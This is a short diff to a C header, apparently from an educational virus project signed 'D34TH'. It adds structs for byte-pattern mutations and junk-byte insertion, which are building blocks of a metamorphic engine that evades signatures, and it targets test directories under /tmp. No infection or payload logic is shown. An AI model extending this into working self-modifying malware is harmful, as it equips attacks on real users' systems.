@@ -24,6 +24,19 @@ typedef struct	s_exec_ctx
 	char	**envp;
 }	t_exec_ctx;
 
+typedef struct {
+    uint8_t orig[16];
+    size_t orig_len;
+    uint8_t repl[16];
+    size_t repl_len;
+    const char *name;
+} t_mutation;
+
+typedef struct {
+    uint8_t bytes[12];
+    size_t len;
+} t_junk;
+
 #define SIGNATURE_STR "\0" "D34TH version 1.0 (c)oded by mbatty-pboucher - 0000000000000000:0000000000000000"
 #define FINGERPRINT_START 46
 #define _WKq 		{"/tmp/test","/tmp/test2"}
